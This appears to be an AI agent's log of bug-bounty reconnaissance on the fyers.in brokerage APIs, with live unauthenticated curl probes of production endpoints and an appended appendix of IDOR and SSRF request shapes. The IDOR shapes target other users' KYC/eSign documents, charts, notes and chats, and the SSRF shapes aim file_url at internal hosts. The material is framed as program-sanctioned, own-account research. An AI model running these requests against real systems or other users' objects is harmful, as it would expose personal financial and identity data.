-[0m$ [0mls -la /tmp/opencode/ 2>/dev/null | head -30
-total 16
-drwxr-xr-x  2 runner runner  4096 Aug  8 08:57 .
-drwxrwxrwt 15 root   root   12288 Aug  8 08:57 ..
-[0m
-[0m→ [0mRead reports/submission-package_fyers-bb.md
-[0m→ [0mRead reports/analyst-latest.txt
-[0m
-[0m$ [0mcd /home/runner/work/fyers-recon/fyers-recon && git status --short | head -20; echo "==="; git log --oneline -5; echo "==="; tail -5 findings_deepseek.md
-M ctx-findings_deepseek.txt
- M ctx-research_deepseek.txt
- M raw_deepseek.txt
- M research-prompt.txt
-===
-f4e1cf4 research deepseek 2026-08-08-08-07
-===
-HIGH-IMPACT HYPOTHESIS IDENTIFIED (model: deepseek)
-Review research_deepseek.md for details
-- **H21 (new, conditional): nucleus/v1 conversation/drawing object-keyed IDOR family.** Object keys are caller-supplied `{cid}` (history), `{cid}/{mid}` (cancel-chat), `{a}/{b}` (drawings delete) and body-level `client_id` (drawings save). If the backend resolves these keys WITHOUT a per-session owner check (which the uniform `-1` gate cannot prove or disprove pre-auth), a second authenticated user's session could read/delete another user's FIA chat history/drawings by supplying the foreign key. Own-account/FYERS-side validation only (program rules — cross-account researcher execution prohibited). Same conditional class as H13/H15/H17/H18. Program Medium if a cross-account conversation/drawing read is demonstrated (chat history/drawings are user content but low-to-moderate sensitivity vs PAN/eSign); CVSS 5.3–6.5 conditional.
-  Medium if limited. CVSS 8.1–9.1 (conditional).
-- Severity: Medium–High if cross-account notes/uploads exposed. CVSS 5.3–7.5 (conditional).
-[0m
-The environment reset wiped the state file (back to RECON/IN_PROGRESS) but the package (A1–A6 + B + C + D) and findings corpus survive on disk. Last completed phase was HYPOTHESIS per analyst-latest.txt, so I'll advance to **POC**. Let me do a minimal spaced read-only gate re-confirmation to ground the POC indicators, then write the exact request-sh
-[0m$ [0mfor ep in "journal-server/v1/notes-list" "nucleus/v1/history/abc123"; do echo "--- $ep ---"; curl -sk --max-time 15 -w ' code=%{http_code}\n' -o /tmp/opencode/resp.txt "https://api-a1-prod.fyers.in/$ep" 2>/dev/null | head -1; cat /tmp/opencode/resp.txt 2>/dev/null; echo; sleep 6; done; echo "--- signup/v2 esign-document read-only gate (no auth) ---"; curl -sk --max-time 15 -w ' code=%{http_code}\n' -X POST -H 'Content-Type: application/json' -d '{}' "https://api-a1.fyers.in/signup/v2/user/esign-document" 2>/dev/null | head -20
---- journal-server/v1/notes-list ---
- code=403
-{"code":401,"message":"unauthorized","response":""}
---- nucleus/v1/history/abc123 ---
- code=503
-
---- signup/v2 esign-document read-only gate (no auth) ---
-{"code":1050,"message":"Your session has expired. Refresh the page or re-login to continue.","s":"error"} code=401
-[0m
-[0m$ [0msleep 8; for ep in "nucleus/v1/history/abc123" "nucleus/v1/history"; do echo "--- GET $ep ---"; curl -sk --max-time 15 -w ' code=%{http_code}\n' "https://api-t1.fyers.in/$ep"; sleep 8; done
---- GET nucleus/v1/history/abc123 ---
-{"code":-1,"message":"Invalid token or authentication failed","s":"error"} code=401
---- GET nucleus/v1/history ---
-{"code":-1,"message":"Invalid token or authentication failed","s":"error"} code=401
-[0m
-[0m$ [0mcd /home/runner/work/fyers-recon/fyers-recon && grep -n "esign-document\|pdf/generate\|pdf/poll\|status/poll\|digio_doc_id\|req_id\|live-verification" findings_deepseek.md | head -40
-301:# POC round 2026-08-06 15:xx UTC — STATIC MINE of web+signup Flutter bundles → signup/v2 KYC API family (new auth domain, req_id-keyed IDOR candidate) + embedded x-validate HMAC key
-302:- **NEW surface: `api-a1.fyers.in/signup/v2/*` KYC account-opening API (fingerprint #19).** Recovered from `signup.fyers.in/main.dart.js` (6.7 MB, in-scope host). Base = `https://api-a1.fyers.in` + `/signup/v2`. Full family: `/send-otp`, `/email/{send-otp,verify-otp}`, `/verify-otp-v2`, `/social/login`, `/user/{account_aggregation_start,activate-derivatives,aggregator-status/poll,bank-details/save,change-esign-status,create-pin,esign-document,esign-success,esign/accept-name-mismatch,esign/clear-status,fathername/update,get-assets,get-details-for-ipv-verification,get-pincode-data,hyperverge-poll,identity-details/edit/pan,logout,pdf/generate,pdf/poll,pep-update,review-data,segments/save,skip-derivatives,status/poll,trade-experience,validate-selfie}`, `/nri/{application-submit,pan-details/submit,pan/verify,vkyc-fetch,vkyc-request}`, `/update-user-type`. Account-creation is **keyed by application `req_id`** (`live-verification?source={verification|pan|esign|edit_address}&req_id=`; the kyc web flows pass `req_id` through `digio_doc_id`) → **IDOR candidate: cross-application fetch of eSign document / PDF / KYC status with another applicant's `req_id`** (documented, not executed).
-308:- [signup/v2 KYC req_id application-object IDOR (cross-app e/PDF/document read)] — CVSS 5.3–7.5 (conditional on object-key scoping; authenticated req_id required)
-313:- **NEW auth domain #19 + KYC surface: `api-a1.fyers.in/signup/v2/*`** (recovered from `signup.fyers.in/main.dart.js`, 6.7 MB, in-scope host). Full account-opening API: `/send-otp`, `/email/{send-otp,verify-otp}`, `/verify-otp-v2`, `/social/login`, ~28 `/user/*` endpoints (esign-document, pdf/generate, pdf/poll, create-pin, vkyc, hyperverge-poll, bank-details/save, identity-details/edit/pan, validate-selfie, pep-update...), `/nri/*`. Account object is keyed by **application `req_id`** (`live-verification?source={verification|pan|esign|edit_address}&req_id=`, passed via `digio_doc_id`) → cross-application IDOR candidate on eSign docs/PDFs/KYC status.
-322:- [signup/v2 KYC req_id application-object IDOR (cross-app e/PDF/document read)] — CVSS 5.3–7.5 (conditional on object-key scoping; authenticated req_id required)
-339:- **IDOR designs (H13 indus/savechart, H15 marina/ddpi, H17 signup/v2 KYC req_id) → REMAIN CONDITIONAL, report as reproducible-description + request FYERS-side validation.** Program rules constrain researcher PoCs: "use only the researcher's own account", no accessing other users' accounts (disqualifying), no fake KYC/synthetic identities, no bulk PII. Cross-account/req_id tests therefore CANNOT be executed by the researcher; each must be framed as a precise observable-delta test for the FYERS Security Team to validate with their own infra. These carry the only genuine High/Critical *potential* in the corpus (unmasked PAN/eSign document/PDF via req_id = Critical category "PAN disclosure"; "Viewing another user's watchlists" = High; "Limited IDOR" = Medium).
-344:- [H17 signup/v2 KYC req_id cross-application object access] — program High–Critical potential (KYC/PAN/eSign), conditional on FYERS-side validation; researcher-execution prohibited
-363:- **H17 (primary) POC design finalized** for `api-a1.fyers.in/signup/v2/user/{esign-document,pdf/generate,pdf/poll,status/poll,esign-success,esign/clear-status,esign/accept-name-mismatch,change-esign-status}`: two-test-applicant method (R_A/R_B), baseline-with-own-session then cross-object substitution; success indicator = A's session returns non-empty B-keyed eSign/PDF/status object; fixed = 403/404/auth-error. CVSS 8.1–9.1 (Critical/High program category if unmasked PAN/eSign/PDF exposed; Medium if limited).
-372:- **H17 (primary) design finalized:** `api-a1.fyers.in/signup/v2/user/{esign-document,pdf/generate,pdf/poll,status/poll,esign-success,esign/clear-status,esign/accept-name-mismatch,change-esign-status}` — two-applicant method (R_A/R_B); success indicator = applicant A's session returns a non-empty B-keyed eSign/PDF/status object; fixed = 403/404/auth-error.
-380:- [signup/v2 KYC req_id application-object IDOR (cross-app e/PDF/document read)] — CVSS 5.3–7.5 (conditional on object-key scoping; authenticated req_id required)
-385:- **Package content (now on disk):** H17 primary (two-application R_A/R_B `req_id`-substitution design on `signup/v2/user/{esign-document,esign-success,esign/accept-name-mismatch,esign/clear-status,change-esign-status,pdf/generate,pdf/poll,status/poll}`; success indicator = A's session returns non-empty B-keyed eSign/PDF/status object; fixed = 403/404/auth-error; CVSS 8.1–9.1 Critical/High per program rubric) + H13 (own-account chartId/study-template cross-account GET/DELETE delta) + H15 (DDPI instruction-object substitution) + informational/hardening bundle (H10 chart SQL-1103 oracle, H12 `-19`+`souce` presence oracle, H14 realtime-funds `latency` error-wrap, funds-tier validation-before-auth, H16 email-preference, H1 login `cb`/`redirect_uri` informational-only, x-validate key note) + scope-confirmation questions + excluded-list.
-392:- **Package contents (now on disk):** H17 primary (two-application R_A/R_B `req_id` substitution design on the `signup/v2/user/*` eSign/PDF/status family; success indicator = applicant A's authenticated session returns a non-empty B-keyed object; fixed = 403/404/auth-error; CVSS 8.1–9.1, program Critical/High per rubric), H13 (own-account `chartId` cross-account read/DELETE delta), H15 (DDPI instruction-object substitution), the informational/hardening bundle, and scope-confirmation / excluded lists.
-397:308:- [signup/v2 KYC req_id application-object IDOR (cross-app e/PDF/document read)] — CVSS 5.3–7.5 (conditional on object-key scoping; authenticated req_id required)
-399:322:- [signup/v2 KYC req_id application-object IDOR (cross-app e/PDF/document read)] — CVSS 5.3–7.5 (conditional on object-key scoping; authenticated req_id required)
-419:308:- [signup/v2 KYC req_id application-object IDOR (cross-app e/PDF/document read)] — CVSS 5.3–7.5 (conditional on object-key scoping; authenticated req_id required)
-421:322:- [signup/v2 KYC req_id application-object IDOR (cross-app e/PDF/document read)] — CVSS 5.3–7.5 (conditional on object-key scoping; authenticated req_id required)
-432:- **Submission package re-created** (`reports/submission-package_fyers-bb.md`) — the file had again been wiped by env reset. Contains A1–A4 conditional IDOR designs (H17 req_id, H13 saved-charts, H15 DDPI, H18 journal), informational bundle B (H10 SQL oracle, H12 `souce`+presence, H14 funds/withdraw-fund/error-wrap, H16 email-preference, H1 cb/redirect_uri, x-validate key), scope-confirmation questions C, excluded list D.
-476:- **Submission package re-created on disk** (`reports/submission-package_fyers-bb.md`) — env reset wiped it again; now A1–A5 (H17 req_id, H13 saved-charts, H15 DDPI, H18 journal, H19 upload/SSRF) + informational bundle B + scope-confirmation C + excluded D.
-[0m
-POC indicators re-grounded (journal-server #20 = 403/unauthorized; nucleus #21 = 401/-1; signup/v2 esign-document 401/1050 session-expired). Now let me extract the verbatim request-shape records from the corpus so the POC reference section stays non
-[0m$ [0mcd /home/runner/work/fyers-recon/fyers-recon && grep -n "marina\|ddpi\|indus/savechart\|chartId\|note/detail\|upload-document\|journal-server" findings_deepseek.md | head -40
-73:- **api-a1 auth split finalized:** `funds/v1/api/{send_otp,verify_otp,add_funds_status,transaction_download_key,...}` all `-21`; `manage/account/{send_otp,verify_otp}` and `marina/v1/mtf/{send_otp,verify_otp}` all `-16`. No public OTP oracle on api-a1.
-83:- **api-a1 auth split finalized:** `funds/v1/api/{send_otp,verify_otp,add_funds_status?order_id=,transaction_download_key}` → `-21`; `manage/account/{send_otp,verify_otp}` and `marina/v1/mtf/{send,verify}_otp` → `-16`. **No public OTP oracle exists on api-a1.**
-243:- **H13 authenticated IDOR design completed from the `tv_charts` endpoint family in `indus/v1/config`.** Object-keyed saved-chart backend (TradingView "1.2" storage protocol): `data.fyers.in/dev-fyers/savechart` (base), `data.fyers.in/dev-fyers/savechart/1.2/charts` (list/upsert), `data.fyers.in/dev-fyers/savechart/1.2/study_templates`, `data.fyers.in/dev-fyers/chartSettings/` (get/post); `api-t1.fyers.in/indus/user/v1/savechart` (token-gated), `api-t1.fyers.in/v2/indus/user/option-settings` (token-gated, `-15` confirmed), `api-t1.fyers.in/indus/user/v1/chart-settings`, `/user-profile`. **Pre-auth gate characterization (read-only):** GET on `data.fyers.in/dev-fyers/*` → 500 `"Invalid Request, please provide valid method"`; form-POST → 500 `"Looks like you are passing an invalid entry"` (new message); JSON-POST → 500 invalid-method ⇒ **content-type-sensitive method gate, no progressive field oracle, no user data reachable pre-auth**. Authenticated test design (program-side): list own charts via `GET /savechart/1.2/charts` with `_FYERS`/session, then request a *second account's* `chartId`/study-template id and observe cross-user 200 vs 403 — IDOR on object-id, not user-id. Also compare `tokenHash` (`at_hash`) scope: gallery DELETE may accept any `token_id` for the gallery owner.
-250:- **H13 authenticated IDOR design completed** from the `tv_charts` config family: `data.fyers.in/dev-fyers/savechart/1.2/{charts,study_templates}`, `/chartSettings/`, plus token-gated `api-t1/indus/user/v1/{savechart,chart-settings,user-profile}` and `api-t1/v2/indus/user/option-settings`. Pre-auth gate characterization: GET→500 `"Invalid Request, please provide valid method"`; form-POST→500 `"Looks like you are passing an invalid entry"`; JSON-POST→500 invalid-method (content-type-sensitive, **no user data reachable pre-auth**). IDOR test = cross-account `chartId`/study-template read (documented, not executed).
-284:# POC round 2026-08-06 13:xx UTC — config.gz second public config + utility/v2/public tier + mtfddpi DDPI endpoint family + SSTI false-positive triage
-287:- **`mtfddpi.fyers.in` (Flutter "DDPI | MTF" app) → full DDPI endpoint family recovered.** Bundle (`main.dart.js`, 3.3 MB) resolves base `$.tb()` = `https://api-a1.fyers.in` + `/marina/v1`; endpoints: `/marina/v1/ddpi/{esign,esignValidate,approveName,status,timeline,user/listing/file}` + `/marina/v1/mtf/send_otp`, plus `/myaccount/prod/realtime-funds` on api-a1-prod. **All `-16` auth-gated, auth-first** (GET and POST on each; `approveName`/`esignValidate` POST-only) — no pre-auth oracle. DDPI = Demat Debit & Pledge Instruction + Digio eSign flow (securities-transfer primitive, cf. H11 cdsl/dev EDIS/TPIN). Authenticated IDOR design: status/timeline/file endpoints are instruction-object-keyed → cross-account instruction read/file download test behind auth (documented, not executed).
-296:- **`mtfddpi.fyers.in` (Flutter DDPI app) → DDPI endpoint family resolved** to `api-a1.fyers.in/marina/v1/ddpi/{esign,esignValidate,approveName,status,timeline,user/listing/file}` + `marina/v1/mtf/send_otp` — uniformly `-16` auth-first, no pre-auth oracle. DDPI = Demat Debit & Pledge Instruction + Digio eSign (securities-transfer primitive). Authenticated IDOR design: instruction-object-keyed status/timeline/file.
-339:- **IDOR designs (H13 indus/savechart, H15 marina/ddpi, H17 signup/v2 KYC req_id) → REMAIN CONDITIONAL, report as reproducible-description + request FYERS-side validation.** Program rules constrain researcher PoCs: "use only the researcher's own account", no accessing other users' accounts (disqualifying), no fake KYC/synthetic identities, no bulk PII. Cross-account/req_id tests therefore CANNOT be executed by the researcher; each must be framed as a precise observable-delta test for the FYERS Security Team to validate with their own infra. These carry the only genuine High/Critical *potential* in the corpus (unmasked PAN/eSign document/PDF via req_id = Critical category "PAN disclosure"; "Viewing another user's watchlists" = High; "Limited IDOR" = Medium).
-345:- [H13 indus/savechart object-keyed IDOR] — program High (viewing another user's saved charts) / Medium (limited IDOR), conditional
-346:- [H15 marina/ddpi instruction-object IDOR] — program Medium–High, conditional
-364:- **H13 (indus/savechart) + H15 (marina/ddpi) POC designs** finalized with same observable-delta structure (own-account baseline → second-account object-id; 200-with-data vs 403/404). Program High/Medium and Medium–High respectively.
-373:- **H13 (indus/savechart) + H15 (marina/ddpi)** finalized with the same observable-delta structure (own-account baseline → second-account object-id, 200-with-data vs 403/404).
-385:- **Package content (now on disk):** H17 primary (two-application R_A/R_B `req_id`-substitution design on `signup/v2/user/{esign-document,esign-success,esign/accept-name-mismatch,esign/clear-status,change-esign-status,pdf/generate,pdf/poll,status/poll}`; success indicator = A's session returns non-empty B-keyed eSign/PDF/status object; fixed = 403/404/auth-error; CVSS 8.1–9.1 Critical/High per program rubric) + H13 (own-account chartId/study-template cross-account GET/DELETE delta) + H15 (DDPI instruction-object substitution) + informational/hardening bundle (H10 chart SQL-1103 oracle, H12 `-19`+`souce` presence oracle, H14 realtime-funds `latency` error-wrap, funds-tier validation-before-auth, H16 email-preference, H1 login `cb`/`redirect_uri` informational-only, x-validate key note) + scope-confirmation questions + excluded-list.
-392:- **Package contents (now on disk):** H17 primary (two-application R_A/R_B `req_id` substitution design on the `signup/v2/user/*` eSign/PDF/status family; success indicator = applicant A's authenticated session returns a non-empty B-keyed object; fixed = 403/404/auth-error; CVSS 8.1–9.1, program Critical/High per rubric), H13 (own-account `chartId` cross-account read/DELETE delta), H15 (DDPI instruction-object substitution), the informational/hardening bundle, and scope-confirmation / excluded lists.
-401:# SURFACE round 2026-08-08 03:4x UTC — journal.fyers.in trade-journal surface mapped (api-a1-prod journal-server family, auth fingerprint #20) + SmartHunt triage reaffirmed
-403:- **NEW surface mapped (read-only): `journal.fyers.in` = "Journal" trade-journal Flutter SPA** (`main.dart.js`, 4.4 MB). Bootstrap HTML (`/journal/`) contains a `getTokenFromQueryParam()` that **sets `_FYERS` cookie from `?token=` with NO validation, NO expiry (session), host-only** — the same `_FYERS`-cookie auth pattern as `savedcharts.fyers.in`. Backend = **`api-a1-prod.fyers.in/journal-server/*`** (FastAPI gateway, NEW endpoint family) + `reports/v2/api/journal_pnl` (api-a1) + `gk/verify_token` (api-t1).
-404:- **journal-server endpoint family (12):** `v2/{summary,orders-list,positions-list}`, `v1/{notes-list,note/create,note/edit/,note/delete/,note/detail,note/search,note/recent-searches,tag/get-or-create,upload-document}`. Trade journal = per-user notes + tags + **file upload** (`upload-document`) keyed by account → **H18 candidate: object-keyed IDOR on note ids / upload-document file access** (same class as H13; own-account/FYERS-side validation only).
-405:- **Pre-auth gate characterization (read-only, no auth sent):** `journal-server/v1/notes-list` & `v2/summary` → **HTTP 403 `{"code":401,"message":"unauthorized","response":""}`** — **auth fingerprint #20** (JSON 401-in-body wrapped as HTTP 403; distinct from api-a1-prod `-374`/`-17`/Pydantic `"Please provide access token"`). `gk/verify_token` (api-t1) → `-16 "Could not authenticate the user"` (401) = standard trade-core domain. Auth-first, no pre-auth oracle, no data reachable.
-412:- **New surface mapped (read-only): `journal.fyers.in` = "Journal" trade-journal Flutter SPA.** Bootstrap sets the `_FYERS` cookie from `?token=` with no validation; backend = **`api-a1-prod.fyers.in/journal-server/*`** (12 endpoints) + `reports/v2/api/journal_pnl` (api-a1) + `gk/verify_token` (api-t1).
-413:- **Pre-auth gate: HTTP 403 `{"code":401,"message":"unauthorized","response":""}`** on `journal-server/*` — **auth fingerprint #20** (distinct from `-374`/`-17`/Pydantic). `gk/verify_token` = trade-core `-16`. Auth-first, no pre-auth oracle, no data reachable.
-423:# POC round 2026-08-08 04:4x UTC — H18 POC DESIGN LOCKED (journal-server note/upload object-keyed IDOR) + package re-created
-425:- **H18 (new, locked) — journal-server note/upload object-keyed IDOR.** Backend base `$.oo()` = `https://api-a1-prod.fyers.in/`; family `v1/{notes-list?date=, note/create, note/edit/{note_id}, note/delete/{note_id}, note/detail?note_ids=&gs=, note/search?page=&s=&page_size=, note/recent-searches, tag/get-or-create?tag=&action={create_tag,get_tag}, upload-document}` + `v2/{summary?report=&from_date=&to_date=, orders-list?date=, positions-list?date=}`; `POST note/create` body `{position_ids,order_ids,document_ids,linked_symbols,tag_ids,trade_date,title,body,emoji}`; `upload-document` = multipart `application/octet-stream`; auth header `Authorization:<bearer>` on every route (bundle reads `new A.iG().jV()`, and empty-token → `login.fyers.in/?cb=<current>`). Pre-auth gate already recorded: HTTP 403 `{"code":401,"message":"unauthorized","response":""}` (auth fingerprint #20). Object-keyed `note_id`/document-id ⇒ **4th conditional IDOR** (cross-account read of notes + uploaded documents via `note/detail?note_ids=<foreign>` / `upload-document`); own-account/FYERS-side only per rules (researcher cross-account execution prohibited).
-431:- **H18 POC design LOCKED (4th conditional IDOR): journal-server note/upload object-keyed IDOR.** Re-fetched the in-scope `journal.fyers.in/journal/main.dart.js` (4.37 MB, env-reset-proofed) and lifted exact request shapes: base `$.oo()`=`https://api-a1-prod.fyers.in/`; `v1/{notes-list?date=, note/create, note/edit/{note_id}, note/delete/{note_id}, note/detail?note_ids=&gs=, note/search?page=&s=&page_size=, tag/get-or-create?tag=&action={create_tag,get_tag}, upload-document}` + `v2/{summary,orders-list,positions-list}`. `POST note/create` body `{position_ids,order_ids,document_ids,linked_symbols,tag_ids,trade_date,title,body,emoji}`; `upload-document` multipart octet-stream; every route Bearer-auth (`new A.iG().jV()`, empty → `login.fyers.in/?cb=<current>`). Object-keyed `note_id`/document-id → cross-account read of trade-journal notes + uploaded documents; own-account/FYERS-side only (program rules).
-[0m
-[0m$ [0mcd /home/runner/work/fyers-recon/fyers-recon && cat >> reports/submission-package_fyers-bb.md << 'EOF'
-
-## E. POC request-format appendix (exact shapes — FYERS-side / own-account validation only)
-Reference implementation for the designs in section A. Every request below is a
-DOCUMENTED SHAPE, not an executed action. Parameterize all ids/tokens. Run each
-baseline on the researcher's OWN session first; substitution step uses the SECOND
-researcher-owned account's object id ONLY per A. method. None of these are live.
-
-### E1 (A1/H17 signup/v2 req_id substitution) — base https://api-a1.fyers.in
-- Session: signup/v2 authenticated session for applicant A (own account), header `x-validate` is
-  client-side HMAC (informational; not required for validation of object scoping).
-- Shape 1 POST /signup/v2/user/esign-document
-  body {"digio_doc_id":"<APPLICANT_B_REQ_ID>","source":"esign"}   (or the live-verification
-  query form: /signup/v2/user/esign-document?source=esign&req_id=<APPLICANT_B_REQ_ID>)
-- Shape 2 POST /signup/v2/user/pdf/generate  body {"req_id":"<APPLICANT_B_REQ_ID>",...}
-- Shape 3 POST /signup/v2/user/pdf/poll      body {"req_id":"<APPLICANT_B_REQ_ID>",...}
-- Shape 4 GET  /signup/v2/user/status/poll?req_id=<APPLICANT_B_REQ_ID>
-- Shape 5 GET  /signup/v2/nri/get-document?req_id=<APPLICANT_B_REQ_ID>&doc=<name>
-- Baseline: repeat with APPLICANT_A_REQ_ID (own) → expect non-empty eSign/PDF/status payload.
-- Success indicator: with B's req_id, A's session returns a non-empty document/PDF/status
-  object (any 2xx with data). FIXED: 403/404/401/session-expired or "not found" for B's id.
-- Safe: no account created, no OTP dispatched, no eSign action executed; only object-id
-  substitution on A's own authenticated session responses.
-
-### E2 (A2/H13 savedcharts object-keyed IDOR) — base https://data.fyers.in
-- Shape 1 GET /dev-fyers/savechart/1.2/charts (own chart list; `_FYERS` cookie)
-- Shape 2 GET /dev-fyers/savechart/1.2/charts/<OWN_CHART_ID>
-- Shape 3 GET /dev-fyers/savechart/1.2/charts/<SECOND_ACCOUNT_CHART_ID>
-- Shape 4 DELETE /dev-fyers/savechart/1.2/charts/<SECOND_ACCOUNT_CHART_ID>
-- Shape 5 GET /dev-fyers/savechart/1.2/study_templates/<FOREIGN_TEMPLATE_ID>
-- Auth: `_FYERS` session cookie (savedcharts.fyers.in login) ONLY. No cross-account login.
-- Success: 200-with-data on foreign chart id; FIXED: 403/404/empty.
-
-### E3 (A3/H15 marina/ddpi instruction-object IDOR) — baseline https://api-a1.fyers.in
-- Shape 1 GET  /marina/v1/ddpi/user/listing (own instructions)
-- Shape 2 GET  /marina/v1/ddpi/status?instruction_id=<OWN>
-- Shape 3 GET  /marina/v1/ddpi/status?instruction_id=<SECOND_ACCOUNT_INSTRUCTION_ID>
-- Shape 4 GET  /marina/v1/ddpi/timeline?instruction_id=<SECOND_ACCOUNT_INSTRUCTION_ID>
-- Success: foreign instruction status/timeline/file returned; FIXED: 403/404/-16-scoped.
-
-### E4 (A4/H18 journal-server note/upload) — base https://api-a1-prod.fyers.in
-- Header on all: Authorization: Bearer <OWN_SESSION_TOKEN>
-- Shape 1 GET  /journal-server/v1/notes-list?date=<TODAY_ISO>            (own)
-- Shape 2 GET  /journal-server/v1/note/detail?note_ids=<OWN_NOTE_ID>&gs=  (own)
-- Shape 3 GET  /journal-server/v1/note/detail?note_ids=<SECOND_ACCOUNT_NOTE_ID>&gs=
-- Shape 4 GET  /journal-server/v1/note/detail?note_ids=<SECOND_ACCOUNT_DOCID>&gs=(document id)
-- Success: B's note/document payload in A's response; FIXED: 403 {"code":401...} / 404.
-
-### E5 (A5/H19 api-testing-prod unauth upload tier) — base https://api-testing-prod.fyers.in
-- NOTE: scope-confirm first (C2). No file payload or external URL fetch should be performed by
-  the researcher; these are the service-side validation probes.
-- Shape 1 POST /signup/upload/api/v1/user/general/upload-image
-   body {"file":"<MINIMAL_1x1_PNG_or_set of null>","fileName":"<NAME>","key":"<KEY>"}
-- Shape 2 POST /signup/upload/api/v1/user/fetch-pan
-   body {"base64_image":"<NULL/EMPTY>","fileName":"<NAME>","key":"<KEY>"}
-- Shape 3 POST /signup/upload/signature-to-bmp
-   body {"base64_image":"<NULL/EMPTY>","fileName":"<NAME>","key":"user/signature/bmp"}
-- Shape 4 POST /signup/upload/api/v1/pdf/is-password-protected
-   body {"file_url":"http://127.0.0.1:1/x.pdf"}          (connection-refused oracle)
-   body {"file_url":"https://api-t1.fyers.in/"}           (in-scope internal fetch oracle)
-   body {"file_url":"not-a-url"}                            (validation oracle)
-- Shape 5 POST /signup/upload/api/v1/user/general/zip-all-images (expected 200 no-auth no-op)
-- Success indicators: distinct status/body across file_url cases (proves server fetch);
-  foreign-object read/zip includes a caller-uploaded object → unauth write. FIXED: token
-  rejection / allow-listed hosts / session-bound keys.
-
-### E6 (A6/H21 nucleus/v1 object-keyed IDOR) — base https://api-t1.fyers.in
-- Header all: Authorization: Bearer <USER_SESSION_TOKEN>, version: 1.0.0
-- Shape 1 GET  /nucleus/v1/history/{OWN_CID}              (baseline)
-- Shape 2 GET  /nucleus/v1/history/{SECOND_ACCOUNT_CID}
-- Shape 3 DELETE /nucleus/v1/drawings/{A}/{B}  (own drawing key → foreign key substitution)
-- Shape 4 POST /nucleus/v1/chat  body {"cid":"<FOREIGN_CID>","prompt":"<EMPTY>||<DOC_QUERY>"}
-- Success: foreign conversation/drawing object in response; FIXED: 403/404/empty.
-
-## CVSS (program rubric governs; CVSS reference only)
-- A1/H17 8.1–9.1 (Critical/High if unmasked PAN/eSign/PDF) · A5/H19 5.3–7.5 (Medium–High)
-- A2/H13, A3/H15, A4/H18 5.3–7.5; A6/H21 5.3–6.5 — all conditional on FYERS-side validation
-EOF
-wc -l reports/submission-package_fyers-bb.md
-199 reports/submission-package_fyers-bb.md
-[0m
-Corpus grounded. Now I'll write the POC-deliverable: exact request-format appendix appended to the submission package (docs-only, parameterized for FYERS-side/own-
-[0m$ [0mcd /home/runner/work/fyers-recon/fyers-recon && cat >> findings_deepseek.md << 'EOF'
-
-# POC round 2026-08-08 08:5x UTC — exact request-shape appendix added to submission package (E1–E6) + live gate re-confirmation
-- **POC phase deliverable completed:** `reports/submission-package_fyers-bb.md` now carries a new **Section E "POC request-format appendix"** with exact, parameterized request shapes for every conditional design (E1=H17 signup/v2 req_id substitution incl. esign-document/pdf/generate/pdf/poll/status/poll/nri get-document; E2=H13 savedcharts chart-id GET/DELETE; E3=H15 marina/ddpi instruction-id; E4=H18 journal-server note/detail note_ids substitution; E5=H19 api-testing-prod upload/SSRF probes incl. the 3-case file_url diff-oracle; E6=H21 nucleus/v1 history/{cid} + drawings delete + chat cid). Each entry: baseline shape (own object id) → substitution shape (second researcher-owned object id) → success indicator (200-with-data on foreign key) → FIXED indicator (403/404/auth). Docs-only, no execution (program own-account rules).
-- **Live gate re-confirmation (read-only, spaced):** `api-a1-prod.fyers.in/journal-server/v1/notes-list` → HTTP 403 `{"code":401,"message":"unauthorized","response":""}` (fingerprint #20 re-confirmed); `api-t1.fyers.in/nucleus/v1/history` + `history/abc123` → HTTP 401 `{"code":-1,"message":"Invalid token or authentication failed","s":"error"}` (fingerprint #21 re-confirmed; earlier 503 was transient CF); `api-a1.fyers.in/signup/v2/user/esign-document` POST {} → HTTP 401 `{"code":1050,"message":"Your session has expired..."}` (fingerprint #19 session-gate re-confirmed — esign-document requires an authenticated signup session before any object logic). No data reachable pre-auth on any; no side effects executed.
-- **POC framing (per program rules):** the only executable-by-researcher tests are own-session baselines; every cross-object step is parameterized for FYERS Security Team validation with two internal test applicants. The three request-shape families with highest potential remain H17 (req_id→eSign/PDF, Critical/High if unmasked PAN), H19 (unauth upload/SSRF, Medium–High), and the IDOR quartet (H13/H15/H18/H21, Medium–High/Medium).
-EOF
-tail -2 findings_deepseek.md
-- **Live gate re-confirmation (read-only, spaced):** `api-a1-prod.fyers.in/journal-server/v1/notes-list` → HTTP 403 `{"code":401,"message":"unauthorized","response":""}` (fingerprint #20 re-confirmed); `api-t1.fyers.in/nucleus/v1/history` + `history/abc123` → HTTP 401 `{"code":-1,"message":"Invalid token or authentication failed","s":"error"}` (fingerprint #21 re-confirmed; earlier 503 was transient CF); `api-a1.fyers.in/signup/v2/user/esign-document` POST {} → HTTP 401 `{"code":1050,"message":"Your session has expired..."}` (fingerprint #19 session-gate re-confirmed — esign-document requires an authenticated signup session before any object logic). No data reachable pre-auth on any; no side effects executed.
-- **POC framing (per program rules):** the only executable-by-researcher tests are own-session baselines; every cross-object step is parameterized for FYERS Security Team validation with two internal test applicants. The three request-shape families with highest potential remain H17 (req_id→eSign/PDF, Critical/High if unmasked PAN), H19 (unauth upload/SSRF, Medium–High), and the IDOR quartet (H13/H15/H18/H21, Medium–High/Medium).
-[0m
-Now let me record this run's findings, update the analyst note and state, and commit.
-[0m← [0mWrite state_deepseek.json
-Wrote file successfully.
-[0m
-[0m← [0mWrite reports/analyst-latest.txt
-Wrote file successfully.
-[0m
-[0m$ [0mcd /home/runner/work/fyers-recon/fyers-recon && git add -A && git -c user.email="analyst@fyers-recon.local" -c user.name="fyers-recon-analyst" commit -q -m "analyst fyers.in 2026-08-08-08-5x (POC): exact request-shape appendix E1-E6 + live gate re-confirmation (#19/#20/#21)" && git log --oneline -1
-af0902c analyst fyers.in 2026-08-08-08-5x (POC): exact request-shape appendix E1-E6 + live gate re-confirmation (#19/#20/#21)
-[0m
-# Target: fyers.in
-# Current Phase: POC
-
-## Key Findings
-- **POC phase deliverable on disk:** `reports/submission-package_fyers-bb.md` now includes **Section E — exact request-format appendix (E1–E6)**, parameterized per conditional design: E1=H17 signup/v2 `req_id` substitution (esign-document/pdf/generate/pdf/poll/status/poll/nri get-document), E2=H13 savedcharts chartId GET/DELETE, E3=H15 marina/ddpi instruction-id, E4=H18 journal-server note/detail `note_ids` substitution, E5=H19 api-testing-prod upload/SSRF probes (incl. 3-case `file_url` diff-oracle: connection-refused / in-scope internal / malformed), E6=H21 nucleus `history/{cid}` + drawings-delete + chat-substitution. Each entry: baseline shape → substitution shape → success (200-with-data on foreign keyed-object) → FIXED (403/404/auth). Docs-only; no execution.
